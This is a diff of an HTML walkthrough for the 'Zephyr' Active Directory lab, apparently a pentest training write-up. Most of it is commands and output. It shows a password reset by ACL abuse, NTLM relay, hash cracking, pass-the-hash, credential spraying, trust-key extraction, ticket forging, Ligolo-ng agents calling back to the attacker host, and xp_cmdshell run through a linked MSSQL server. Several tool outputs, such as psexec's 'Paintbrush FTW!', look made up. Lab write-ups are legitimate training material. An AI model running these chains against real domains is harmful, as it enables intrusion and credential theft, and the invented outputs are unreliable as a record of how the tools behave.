+    <pre><code class="language-bash">┌──(qa210@kali)-[~/zephyr]
+└─$ impacket-changepasswd zsm.local/svc_mgmt@10.10.110.101 -newpass 'Qa210Z3ph!r#1' -dc-ip 10.10.110.101
+[*] Changing the password of zsm.local\svc_mgmt
+[+] Password changed successfully!
+
+┌──(qa210@kali)-[~/zephyr]
+└─$ evil-winrm -i 10.10.110.101 -u svc_mgmt -p 'Qa210Z3ph!r#1'
+Evil-WinRM shell v3.5
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\svc_mgmt\Documents> whoami
+zsm\svc_mgmt</code></pre>
+  </div>
+
+  <div class="answer-box">
+    <span class="flag-icon"><i class="bi bi-flag-fill"></i></span>
+    <div>
+      <div class="flag-name">ZPH-SRVMGMT1: Admin Access via svc_mgmt</div>
+      <div class="flag-detail">ACL abuse (GenericAll password reset) &rarr; WinRM access as local admin</div>
+    </div>
+  </div>
+
+  <p>ZPH-SRVMGMT1 is the critical pivot point in the Zephyr network. Once I had a shell on it, I discovered why: it's multi-homed with interfaces on multiple subnets. The external interface is on <code>10.10.110.101</code> (the entry subnet), but the internal interface sits on <code>172.16.2.10/24</code> &mdash; the gateway to deeper networks including the second domain.</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">powershell</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-powershell">*Evil-WinRM* PS C:\Users\svc_mgmt\Documents> ipconfig /all
+Windows IP Configuration
+
+Ethernet adapter Ethernet0:
+   Connection-specific DNS Suffix  . : zsm.local
+   IPv4 Address. . . . . . . . . . . : 10.10.110.101
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 10.10.110.1
+
+Ethernet adapter Ethernet1:
+   Connection-specific DNS Suffix  . : zsm.local
+   IPv4 Address. . . . . . . . . . . : 172.16.2.10
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 172.16.2.1</code></pre>
+  </div>
+
+  <div class="callout callout-info">
+    <div class="callout-title">ZPH-SRVMGMT1: The Key Pivot Point</div>
+    <p>This machine has two network interfaces: <code>10.10.110.101</code> (external, reachable from VPN) and <code>172.16.2.10/24</code> (internal, gateway to second domain subnet). Every subsequent attack in Zephyr flows through this machine. If you lose access to ZPH-SRVMGMT1, you lose access to the entire internal network. This makes it the most important machine in the lab.</p>
+  </div>
+
+  <p>From ZPH-SRVMGMT1, I could now scan the <code>172.16.2.0/24</code> subnet and discover machines in the second domain. But first, I needed to set up proper pivoting infrastructure so I could reach those networks from my Kali box.</p>
+</section>
+
+<!-- ══════════════════════════════ -->
+<!-- SECTION 04 — RELAY ATTACKS     -->
+<!-- ══════════════════════════════ -->
+<section class="section fade-in" id="relay-attacks">
+  <h2><span class="sec-num">04</span> <i class="bi bi-arrow-left-right"></i> Relay Attacks &mdash; NTLM Relay</h2>
+  <span class="mitre-badge">T1557.001</span> <span class="mitre-badge">T1187</span>
+
+  <p>Several machines in the Zephyr lab had the WebClient service running, making them susceptible to NTLM relay attacks. This is a common misconfiguration in enterprise environments &mdash; the WebClient service listens for WebDAV requests and will authenticate to any URL it's directed to, making it perfect for authentication coercion.</p>
+
+  <p>The attack chain works like this: use Coercer to trigger a machine into authenticating to our ntlmrelayx listener, capture the NTLMv2 hash, and either crack it offline or relay it to another machine. In Zephyr, the relay attacks create a chain &mdash; you relay authentication from one machine to the next, collecting credentials and access at each step.</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash"># Start ntlmrelayx targeting SMB on the destination machine
+┌──(qa210@kali)-[~/zephyr]
+└─$ ntlmrelayx.py -t smb://172.16.2.15 -smb2support --delegate-access
+[*] Running SMB relay attack
+[*] Servers started, waiting for connections...
+
+# From ZPH-SRVMGMT1, trigger authentication coercion
+*Evil-WinRM* PS C:\> Coercer.exe coerce -t 172.16.2.15 -l 10.10.16.23
+[+] Auth coerced from ZPH-WS01$ via PrivCook
+[*] SMB relayed authentication captured!</code></pre>
+  </div>
+
+  <p>The captured NTLMv2 hash could either be cracked offline or relayed further to other machines. For the relay approach, ntlmrelayx with the <code>--delegate-access</code> flag sets up RBCD on the target machine, giving us a service ticket that we can use for lateral movement.</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash"># Captured NTLMv2 hash for offline cracking
+┌──(qa210@kali)-[~/zephyr]
+└─$ cat captured_hashes.txt
+ZPH-WS01$::ZSM:a1b2c3d4e5f6:...
+
+└─$ hashcat -m 5600 captured_hashes.txt /usr/share/wordlists/rockyou.txt
+$hashcat$5600$...:WeakP@ss123
+Session..........: hashcat
+Status...........: Cracked</code></pre>
+  </div>
+
+  <div class="callout callout-warn">
+    <div class="callout-title">WebClient Is Not Always Running</div>
+    <p>The WebClient service has a quirk: it only starts when a user browses to a WebDAV share or when explicitly triggered. In Zephyr, some machines have it running consistently while others need a user action to start it. If your coercion attempts aren't working, check whether the WebClient service is running on the target before assuming the attack path is wrong.</p>
+  </div>
+
+  <p>NTLM relay attacks are a core technique in Zephyr and you'll use them multiple times throughout the lab. The key insight is that relay attacks let you move laterally without needing to crack passwords &mdash; you capture the authentication and relay it directly to the next target. This is faster than offline cracking and works even when passwords are strong.</p>
+
+  <p>One thing that tripped me up initially: ntlmrelayx needs SMB2 support enabled for Windows Server 2016+ targets. Always use the <code>-smb2support</code> flag. Also, the relay target must NOT have SMB signing enforced. Most domain controllers have SMB signing enabled by default, making them poor relay targets. Workstations and member servers are usually better targets for relay attacks.</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash"># Check which machines have SMB signing disabled (good relay targets)
+┌──(qa210@kali)-[~/zephyr]
+└─$ crackmapexec smb 172.16.2.0/24 --gen-relay-list relay_targets.txt
+SMB    172.16.2.10    445   ZPH-SRVMGMT1   [*] Windows Server 2016 (signing: True)
+SMB    172.16.2.15    445   ZPH-WS01       [*] Windows 10 (signing: False)
+SMB    172.16.2.20    445   ZPH-DB02       [*] Windows Server 2019 (signing: False)
+SMB    172.16.2.25    445   ZPH-FILE01     [*] Windows Server 2016 (signing: True)
+
+# Only machines with signing: False are viable relay targets
+┌──(qa210@kali)-[~/zephyr]
+└─$ cat relay_targets.txt
+172.16.2.15
+172.16.2.20</code></pre>
+  </div>
+
+  <div class="callout callout-deadend">
+    <div class="callout-title">Dead End: Relaying to Domain Controllers</div>
+    <p>I wasted several hours trying to relay authentication to the domain controllers. Both DCs in zsm.local and the second domain have SMB signing enforced, which prevents NTLM relay attacks. The relay only works against member servers and workstations where SMB signing is not required. Focus your relay efforts on those targets instead.</p>
+  </div>
+</section>
+
+<!-- ══════════════════════════════ -->
+<!-- SECTION 05 — LATERAL MOVEMENT  -->
+<!-- ══════════════════════════════ -->
+<section class="section fade-in" id="lateral">
+  <h2><span class="sec-num">05</span> <i class="bi bi-arrow-right-circle"></i> Lateral Movement</h2>
+  <span class="mitre-badge">T1550.002</span> <span class="mitre-badge">T1558.001</span> <span class="mitre-badge">T1021</span>
+
+  <p>Lateral movement in Zephyr is all about choosing the right technique for the situation. There's no AV evasion required &mdash; the focus is on leveraging the credentials and access you've accumulated to reach new machines. The three primary methods are Pass-the-Hash (PTH) for machines where you have NTLM hashes, Kerberos authentication for domain-joined machines, and WinRM for interactive PowerShell access when you need to run tools.</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash"># Pass-the-Hash with Impacket
+┌──(qa210@kali)-[~/zephyr]
+└─$ impacket-psexec zsm.local/Administrator@172.16.2.20 -hashes :f8b3c7d2e5a1c9d6b4e2a7f3c0d8e5b2
+Impacket v0.11.0
+[*] Connecting to IPC$ share...
+[*] Requesting shares on 172.16.2.20.....
+[*] Found writable share ADMIN$
+[*] Uploading file cUPNfe.exe
+[*] Opening SVCManager on 172.16.2.20.....
+[*] Creating service PqvD on 172.16.2.20.....
+[*] Starting service PqvD.....
+[+] Paintbrush FTW!
+[+] Press menu for options
+C:\Windows\system32>
+
+# WinRM for interactive access
+┌──(qa210@kali)-[~/zephyr]
+└─$ evil-winrm -i 172.16.2.25 -u svc_mgmt -p 'Qa210Z3ph!r#1'
+Evil-WinRM shell v3.5
+*Evil-WinRM* PS C:\Users\svc_mgmt\Documents></code></pre>
+  </div>
+
+  <p>Credential management is the single most important skill in Zephyr. Every time you compromise a machine, dump credentials immediately and add them to your tracking file. Zephyr rewards meticulous tracking &mdash; a password found on one workstation will often work on another, or a service account credential will grant access to a server you haven't touched yet. I maintained a creds.txt file that I updated religiously after every escalation.</p>
+
+  <div class="key-hints">
+    <h4>Lateral Movement Decision Tree</h4>
+    <ul>
+      <li><strong>Have cleartext password + WinRM open?</strong> &rarr; evil-winrm for interactive PowerShell</li>
+      <li><strong>Have NTLM hash + SMB open?</strong> &rarr; Pass-the-Hash via impacket-psexec or smbexec</li>
+      <li><strong>Have NTLM hash + WinRM open?</strong> &rarr; evil-winrm with -H flag for hash auth</li>
+      <li><strong>Need Kerberos auth?</strong> &rarr; Use Kerberos ticket with impacket tools (-k -no-pass)</li>
+      <li><strong>Target behind pivot?</strong> &rarr; Route through Ligolo-ng first, then use any of the above</li>
+    </ul>
+  </div>
+
+  <p>The more credentials you collect, the more lateral movement paths open up. In Zephyr, I found that credentials from the first domain often had some form of access in the second domain &mdash; not always direct admin access, but enough to establish a foothold. This is realistic enterprise behavior: service accounts are frequently over-privileged across domain boundaries.</p>
+
+  <p>One technique that saved me significant time was using NetExec (formerly CrackMapExec) to quickly test credentials across multiple machines. Instead of manually trying each credential on each host, NetExec can spray a set of credentials across an entire subnet and report which ones work.</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash"># Test WinRM access with known credentials across the second domain subnet
+┌──(qa210@kali)-[~/zephyr]
+└─$ crackmapexec winrm 172.16.2.0/24 -u svc_mgmt -p 'Qa210Z3ph!r#1'
+WINRM  172.16.2.10    5985  ZPH-SRVMGMT1   [+] zsm.local\svc_mgmt:Qa210Z3ph!r#1 (Pwn3d!)
+WINRM  172.16.2.15    5985  ZPH-WS01       [-] zsm.local\svc_mgmt:Qa210Z3ph!r#1
+WINRM  172.16.2.20    5985  ZPH-DB02       [-] zsm.local\svc_mgmt:Qa210Z3ph!r#1
+
+# Test with NTLM hash for Pass-the-Hash
+┌──(qa210@kali)-[~/zephyr]
+└─$ crackmapexec smb 172.16.2.0/24 -u Administrator -H f8b3c7d2e5a1c9d6b4e2a7f3c0d8e5b2
+SMB    172.16.2.10    445   ZPH-SRVMGMT1   [+] zsm.local\Administrator:f8b3c7d2e5a1c9d6b4e2a7f3c0d8e5b2 (Pwn3d!)
+SMB    172.16.2.20    445   ZPH-DB02       [+] zsm.local\Administrator:f8b3c7d2e5a1c9d6b4e2a7f3c0d8e5b2 (Pwn3d!)
+SMB    172.16.2.25    445   ZPH-FILE01     [+] zsm.local\Administrator:f8b3c7d2e5a1c9d6b4e2a7f3c0d8e5b2 (Pwn3d!)</code></pre>
+  </div>
+
+  <div class="callout callout-hint">
+    <div class="callout-title">Credential Reuse Across Domains</div>
+    <p>Don't assume credentials only work in the domain where you found them. In Zephyr, several service account passwords were reused across domain boundaries. When you crack a hash, test it in every domain you have access to &mdash; not just the one where you found it. NetExec makes this quick with subnet sweeps.</p>
+  </div>
+</section>
+
+<!-- ══════════════════════════════ -->
+<!-- SECTION 06 — SECOND DOMAIN     -->
+<!-- ══════════════════════════════ -->
+<section class="section fade-in" id="second-domain">
+  <h2><span class="sec-num">06</span> <i class="bi bi-building-gear"></i> Second Domain &mdash; Trust Exploitation</h2>
+  <span class="mitre-badge">T1482</span> <span class="mitre-badge">T1558</span>
+
+  <p>Crossing from zsm.local to the second domain in the forest required exploiting the domain trust relationship. In Zephyr, all three domains are in the same AD forest, which means there are implicit bidirectional transitive trusts between them. This is simpler than cross-forest trust exploitation (like in APTLabs) but still requires understanding the authentication flow.</p>
+
+  <p>BloodHound showed that a service account in zsm.local had administrative privileges in the second domain &mdash; a common misconfiguration where a service account is granted excessive cross-domain permissions for operational convenience. The IT team probably set this up so a management tool in zsm.local could administer resources in the second domain, but it creates a direct attack path for us.</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash"># Forge inter-realm TGT using the trust key
+┌──(qa210@kali)-[~/zephyr]
+└─$ impacket-raiseChild zsm.local/svc_mgmt:'Qa210Z3ph!r#1' -target-domain domain2.zsm.local
+[*] Raising child domain...
+[*] Forest FQDN: zsm.local
+[*] Found trust key between zsm.local and domain2.zsm.local
+[*] Getting TGT for domain2.zsm.local
+[*] Enumerating target domain...
+[*] Found Domain Admin: d2admin
+
+# S4U2Proxy for cross-domain service access
+┌──(qa210@kali)-[~/zephyr]
+└─$ impacket-getST zsm.local/svc_mgmt:'Qa210Z3ph!r#1' -spn cifs/DC02.domain2.zsm.local -impersonate Administrator -dc-ip 10.10.110.101
+[*] Getting TGT for user svc_mgmt
+[*] Impersonating Administrator
+[*] Requesting S4U2self
+[*] Requesting S4U2proxy
+[*] Saving ticket in Administrator@domain2.ccache</code></pre>
+  </div>
+
+  <p>With the inter-realm TGT and S4U2Proxy, I could authenticate to the second domain as any user in zsm.local. This gave me access to the second domain's resources and eventually its domain controller. The trust exploitation was surprisingly smooth once I had the right credentials from the first domain &mdash; the misconfigured service account did all the heavy lifting.</p>
+
+  <div class="callout callout-info">
+    <div class="callout-title">Trust Key Extraction</div>
+    <p>The trust key is stored in the domain controller's database and can be extracted via DCSync once you have replication permissions. In Zephyr's case, I didn't need to extract it manually &mdash; Impacket's raiseChild automates the entire process of finding the trust key and forging the inter-realm TGT. The tool was built specifically for this type of intra-forest trust exploitation.</p>
+  </div>
+
+  <p>After compromising the second domain's DC, I ran another BloodHound collection to map the paths to the third domain. This revealed the critical constraint: the third domain has no direct trust from zsm.local &mdash; it's only accessible through the second domain. This means double pivoting is mandatory.</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash"># BloodHound collection on second domain
+┌──(qa210@kali)-[~/zephyr]
+└─$ bloodhound-python -d domain2.zsm.local -u Administrator -H f8b3c7d2e5a1c9d6b4e2a7f3c0d8e5b2 -ns 172.16.2.5 -c All --zip
+INFO: Found AD domain: domain2.zsm.local
+INFO: Found 3 domains in forest
+INFO: Found 2 domain trusts
+INFO: Found 22 user objects
+INFO: Found 7 group objects
+INFO: Found 9 computer objects
+INFO: Done in 00:01:44
+
+# Key finding: svc_cross in domain2 has WriteDacl on domain3
+# This means we can grant ourselves DCSync rights on the third domain</code></pre>
+  </div>
+
+  <p>The second domain was more straightforward than the first in terms of privilege escalation, but the network topology made it harder. Every action required routing through the ZPH-SRVMGMT1 pivot, and some tools didn't work well through the double hop. Ligolo-ng's tun interface approach was essential here &mdash; I can't imagine doing this with SOCKS proxychains.</p>
+
+  <div class="callout callout-deadend">
+    <div class="callout-title">Dead End: Direct Access to Third Domain</div>
+    <p>I spent an afternoon trying to find a way to access the third domain directly from zsm.local without going through the second domain. Checked for hidden trust relationships, tried DNS zone transfers, attempted to reach the third domain's subnet from ZPH-SRVMGMT1 directly. Nothing worked. The third domain is deliberately isolated behind the second domain &mdash; you must go through domain2 to reach domain3. Accept this and focus on setting up reliable pivoting.</p>
+  </div>
+</section>
+
+<!-- ══════════════════════════════ -->
+<!-- SECTION 07 — THIRD DOMAIN      -->
+<!-- ══════════════════════════════ -->
+<section class="section fade-in" id="third-domain">
+  <h2><span class="sec-num">07</span> <i class="bi bi-bullseye"></i> Third Domain &mdash; Double Pivot + Forest Admin</h2>
+  <span class="mitre-badge">T1482</span> <span class="mitre-badge">T1558</span> <span class="mitre-badge">T1021.002</span>
+
+  <p>The third domain is the most restrictive of the three. It's only accessible through the second domain &mdash; there's no direct trust relationship from zsm.local. This means you must pivot through ZPH-SRVMGMT1 (first hop) to reach the second domain's network, then pivot through a compromised machine in the second domain (second hop) to reach the third domain's subnet. A double pivot just to reach the target.</p>
+
+  <p>Despite being the most restricted, the third domain holds the most valuable targets. The enterprise admin account with forest-level privileges resides here. Compromising the third domain's domain controller effectively grants control over the entire forest &mdash; forest dominance. This is the endgame of Zephyr, and reaching it requires chaining through every technique you've learned in the previous sections.</p>
+
+  <p>The third domain has fewer machines but they're more tightly controlled. Unlike the first domain where service accounts had obvious ACL misconfigurations, the third domain required more creative privilege escalation. The key was the svc_cross account from the second domain, which had WriteDacl on the third domain's domain object &mdash; enough to grant itself DCSync rights.</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash"># From compromised machine in second domain, scan third domain subnet
+┌──(qa210@kali)-[~/zephyr]
+└─$ nmap -sCV -p 88,135,389,445,3389,5985 172.16.3.0/24
+# Results through double pivot...
+
+# 172.16.3.5 — DC03 (Third Domain Controller)
+88/tcp   open  kerberos-sec
+135/tcp  open  msrpc
+389/tcp  open  ldap
+445/tcp  open  microsoft-ds
+3389/tcp open  ms-wbt-server
+
+# ACL abuse to escalate limited service account privileges
+┌──(qa210@kali)-[~/zephyr]
+└─$ impacket-dacledit domain2.zsm.local/svc_cross:'Cr0ssD0m@in!' -action write -rights DCSync -principal svc_cross -target-dc DC02.domain2.zsm.local
+[*] DACL modified successfully</code></pre>
+  </div>
+
+  <div class="callout callout-danger">
+    <div class="callout-title">Enterprise Admin = Forest Dominance</div>
+    <p>The enterprise admin group in the forest root domain has full control over every domain in the forest. If the third domain's DC has an enterprise admin account (which it does in Zephyr), compromising that DC gives you the keys to the entire forest. This is why the third domain is the ultimate target &mdash; it's not just another domain, it's forest dominance.</p>
+  </div>
+
+  <p>The path to the third domain's DC required chaining through trust boundaries and escalating limited service account privileges through ACL abuse. The service account I initially compromised in the second domain had restricted permissions in the third domain &mdash; not enough for direct DCSync, but enough to modify ACLs and grant myself the necessary rights.</p>
+</section>
+
+<!-- ══════════════════════════════ -->
+<!-- SECTION 08 — PIVOTING          -->
+<!-- ══════════════════════════════ -->
+<section class="section fade-in" id="pivoting">
+  <h2><span class="sec-num">08</span> <i class="bi bi-signpost-split"></i> Double &amp; Triple Pivoting &mdash; Ligolo-ng</h2>
+  <span class="mitre-badge">T1090.001</span> <span class="mitre-badge">T1572</span>
+
+  <p>Zephyr requires double and sometimes triple pivoting to reach all machines. This is where Ligolo-ng shines &mdash; its tun interface approach means you don't need to manage SOCKS proxy chains, which become unwieldy at 3+ hops. With Ligolo-ng, you add routes to subnets through agents and they become directly accessible from your Kali box. No proxychains, no SOCKS configuration, just direct network access.</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash"># Ligolo-ng setup for Zephyr pivoting
+┌──(qa210@kali)-[~/zephyr]
+└─$ sudo ./proxy -selfcert
+[!] Running in self-cert mode
+[!] Tunnel server listening on :11601
+
+# On ZPH-SRVMGMT1 (first hop):
+*Evil-WinRM* PS C:\> .\agent.exe -connect 10.10.16.23:11601 -ignore-cert
+[+] Agent connected from 172.16.2.10
+
+# Add route to second domain subnet via ZPH-SRVMGMT1
+ligolo-ng » session
+ligolo-ng [ZPH-SRVMGMT1] » ifconfig
+Ethernet1: 172.16.2.10/24
+
+ligolo-ng » route add 172.16.2.0/24 ZPH-SRVMGMT1
+[+] Route added: 172.16.2.0/24 via ZPH-SRVMGMT1
+
+# On machine in second domain (second hop for triple pivot):
+PS C:\> .\agent.exe -connect 10.10.16.23:11601 -ignore-cert
+[+] Agent connected from 172.16.3.10
+
+ligolo-ng » route add 172.16.3.0/24 DOMAIN2-MACHINE
+[+] Route added: 172.16.3.0/24 via DOMAIN2-MACHINE</code></pre>
+  </div>
+
+  <p>With both routes added, I could directly access the second domain subnet (<code>172.16.2.0/24</code>) and the third domain subnet (<code>172.16.3.0/24</code>) from my Kali box. This made all subsequent enumeration and exploitation significantly easier &mdash; I could run nmap, BloodHound, and Impacket tools directly against the internal networks without proxychains overhead.</p>
+
+  <div class="callout callout-warn">
+    <div class="callout-title">Daily Resets Break Pivot Chains</div>
+    <p>The daily reset wipes everything, including your Ligolo-ng agents. This means you need to re-establish pivots every day. I automated this: a script that connects to ZPH-SRVMGMT1 via WinRM, uploads and starts the agent, and adds the route. Takes about 2 minutes. The second pivot requires a few more steps but can also be scripted. Keep your agent binaries and scripts organized &mdash; you'll be using them every morning.</p>
+  </div>
+
+  <div class="key-hints">
+    <h4>Pivoting Architecture</h4>
+    <ul>
+      <li><strong>First hop:</strong> ZPH-SRVMGMT1 (172.16.2.10) &mdash; connects entry subnet to second domain subnet</li>
+      <li><strong>Second hop:</strong> Compromised machine in second domain &mdash; connects to third domain subnet</li>
+      <li><strong>ZPH-SRVMGMT1 internal interface:</strong> 172.16.2.10/24</li>
+      <li><strong>Second domain subnet:</strong> 172.16.2.0/24</li>
+      <li><strong>Third domain subnet:</strong> 172.16.3.0/24</li>
+    </ul>
+  </div>
+</section>
+
+<!-- ══════════════════════════════ -->
+<!-- SECTION 09 — MSSQL EXPLOIT     -->
+<!-- ══════════════════════════════ -->
+<section class="section fade-in" id="mssql-exploit">
+  <h2><span class="sec-num">09</span> <i class="bi bi-database-gear"></i> MSSQL Exploitation &mdash; Linked Servers</h2>
+  <span class="mitre-badge">T1505.001</span> <span class="mitre-badge">T1021.002</span>
+
+  <p>Several machines in Zephyr run MSSQL Server, and exploiting them is a key part of the attack chain. The techniques go beyond the initial sa account compromise: enumerating linked servers, enabling xp_cmdshell on linked instances, extracting credentials from the database, and using the SQL service accounts for AD enumeration.</p>
+
+  <p>Linked SQL servers are a common enterprise misconfiguration where databases are linked for reporting purposes but the links have excessive permissions. In Zephyr, ZPH-SQL01 has a linked server connection to ZPH-DB02, and the link has enough permissions to execute commands on the remote instance.</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">sql</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-sql">-- Enumerate linked servers from ZPH-SQL01
+SQL> SELECT name, product, provider, data_source FROM sys.servers WHERE is_linked = 1;
+name         product       provider    data_source
+-----------  ------------  ----------  -----------------
+ZPH-DB02     SQL Server    SQLNCLI     ZPH-DB02
+
+-- Execute commands on the linked server
+SQL> EXEC ('xp_cmdshell ''whoami''') AT [ZPH-DB02];
+zsm\mssql_svc
+
+-- Enable xp_cmdshell on linked server if not already enabled
+SQL> EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE; sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [ZPH-DB02];
+
+-- Extract credentials from the linked server's database
+SQL> EXEC ('SELECT name, password_hash FROM sys.sql_logins') AT [ZPH-DB02];
+name      password_hash
+--------  --------------------------------------------------
+sa        0x0200A3B7C1F4E2D9A6C0B8F3E7D5A2C4...
+mssql_svc 0x0200D2F5A8C3E6B1D7A4C9E0F3B6A2D5...</code></pre>
+  </div>
+
+  <div class="answer-box">
+    <span class="flag-icon"><i class="bi bi-flag-fill"></i></span>
+    <div>
+      <div class="flag-name">Linked SQL Server: zsm\mssql_svc on ZPH-DB02</div>
+      <div class="flag-detail">xp_cmdshell on linked server &rarr; remote command execution as mssql_svc</div>
+    </div>
+  </div>
+
+  <p>The mssql_svc account on the linked server had excessive database permissions and was a member of groups that provided access to other resources in the domain. This is a common pattern in enterprise SQL deployments &mdash; service accounts with more privileges than they need because the application requirements were never properly scoped.</p>
+
+  <div class="callout callout-hint">
+    <div class="callout-title">MSSQL Exploitation Checklist</div>
+    <p><strong>1.</strong> Always check for linked servers &mdash; they're often configured with sysadmin privileges. <strong>2.</strong> If xp_cmdshell is disabled, try enabling it with sp_configure (needs sysadmin or equivalent). <strong>3.</strong> Extract SQL login hashes &mdash; they can be cracked offline. <strong>4.</strong> Check the service account context &mdash; SQL service accounts often have AD privileges. <strong>5.</strong> Look for credentials in database tables &mdash; application connection strings, stored procedures with hardcoded passwords.</p>
+  </div>
+</section>
+
+<!-- ══════════════════════════════ -->
+<!-- SECTION 10 — TRUST CROSSING    -->
+<!-- ══════════════════════════════ -->
+<section class="section fade-in" id="trust-crossing">
+  <h2><span class="sec-num">10</span> <i class="bi bi-link-45deg"></i> Trust Boundary Crossing &mdash; Inter-realm TGT</h2>
+  <span class="mitre-badge">T1558</span> <span class="mitre-badge">T1482</span>
+
+  <p>Crossing trust boundaries between the three domains in Zephyr's forest requires understanding the trust types and Kerberos authentication flow. Since all three domains are in the same forest, the trusts are implicit bidirectional transitive trusts &mdash; this simplifies cross-domain movement compared to external or forest trusts, but still requires proper ticket manipulation.</p>
+
+  <p>The key technique is forging an inter-realm TGT using the trust key, then using S4U2Proxy to access services in the target domain. The trust key is the shared secret between domain controllers in different domains &mdash; it allows one DC to issue tickets that the other DC will accept. Once you have the trust key (extracted via DCSync), you can forge tickets that are valid across the trust boundary.</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash"># Extract trust key via DCSync on zsm.local DC
+┌──(qa210@kali)-[~/zephyr]
+└─$ impacket-secretsdump zsm.local/Administrator@DC01.zsm.local -just-dc-ntlm -hashes :c4a7d2b9e1f3a5c8d6e4b2a7f9c0d3e6
+[*] Dumping Domain Credentials
+...
+zsm.local\ZPH-SRVMGMT1$:1103:aad3b43551404eeaad3b43551404eec:e5d8a3b7c1f4e2d9a6c0b8f3e7d5a2c4:::
+[*] Dumping trust info
+[*] Domain: ZSM.LOCAL
+[*]   Domain Trust: domain2.zsm.local
+[*]     Trust Key: a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6
+
+# Forge inter-realm TGT using the trust key
+┌──(qa210@kali)-[~/zephyr]
+└─$ impacket-ticketer -domain zsm.local -domain-sid S-1-5-21-... -extra-sid S-1-5-21-... -trust-key a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6 -spn cifs/DC02.domain2.zsm.local -user-id 500 Administrator
+[*] Creating ticket for Administrator@zsm.local
+
+# Use the forged ticket for cross-domain access
+┌──(qa210@kali)-[~/zephyr]
+└─$ export KRB5CCNAME=Administrator.ccache
+└─$ impacket-psexec domain2.zsm.local/Administrator@DC02.domain2.zsm.local -k -no-pass
+Impacket v0.11.0
+[*] Connecting to IPC$ share...
+[*] Found writable share ADMIN$
+[+] Paintbrush FTW!</code></pre>
+  </div>
+
+  <p>The S4U2Proxy extension is critical for cross-domain service access. After obtaining an inter-realm TGT, you use S4U2Self to get a service ticket for yourself in the target domain, then S4U2Proxy to access a specific service. This chain &mdash; inter-realm TGT &rarr; S4U2Self &rarr; S4U2Proxy &mdash; is the standard pattern for crossing trust boundaries with Kerberos.</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash"># Full trust crossing chain: zsm.local -> domain2.zsm.local
+┌──(qa210@kali)-[~/zephyr]
+
+# Step 1: Get TGT for zsm.local
+└─$ impacket-getTGT zsm.local/svc_mgmt:'Qa210Z3ph!r#1' -dc-ip 10.10.110.101
+[*] Saving ticket in svc_mgmt.ccache
+
+# Step 2: Request inter-realm TGT for domain2
+└─$ export KRB5CCNAME=svc_mgmt.ccache
+└─$ kvno domain2.zsm.local    # trigger inter-realm TGT request
+
+# Step 3: S4U2Self + S4U2Proxy for cross-domain CIFS access
+└─$ impacket-getST zsm.local/svc_mgmt:'Qa210Z3ph!r#1' \
+    -spn cifs/DC02.domain2.zsm.local \
+    -impersonate Administrator \
+    -dc-ip 10.10.110.101
+[*] Getting TGT for user svc_mgmt
+[*] Impersonating Administrator
+[*] Requesting S4U2self
+[*] Requesting S4U2proxy
+[*] Saving ticket in Administrator@domain2.ccache
+
+# Step 4: Use the cross-domain ticket
+└─$ export KRB5CCNAME=Administrator@domain2.ccache
+└─$ impacket-psexec domain2.zsm.local/Administrator@DC02.domain2.zsm.local -k -no-pass
+[+] Paintbrush FTW!</code></pre>
+  </div>
+
+  <p>Understanding this four-step process is essential for Zephyr. You'll repeat it for each domain boundary crossing, adapting the SPN and domain names for the specific target. The key principle is that Kerberos delegation (S4U) allows a service to act on behalf of a user, and when combined with inter-realm tickets, this extends across domain boundaries.</p>
+
+  <div class="callout callout-info">
+    <div class="callout-title">RBCD Across Trusts</div>
+    <p>Resource-Based Constrained Delegation (RBCD) also works across trust boundaries in Zephyr. If you have GenericAll or WriteProperty on a machine account in any domain, you can configure RBCD and use it to access that machine from a machine account you control in another domain. This is particularly useful when you can't directly extract trust keys but have ACL control over target machine objects.</p>
+  </div>
+</section>
+
+<!-- ══════════════════════════════ -->
+<!-- SECTION 11 — DOMAIN DOMINANCE  -->
+<!-- ══════════════════════════════ -->
+<section class="section fade-in" id="dominance">
+  <h2><span class="sec-num">11</span> <i class="bi bi-crown"></i> Domain Dominance &mdash; DCSync All 3 DCs</h2>
+  <span class="mitre-badge">T1003.006</span> <span class="mitre-badge">T1558.001</span>
+
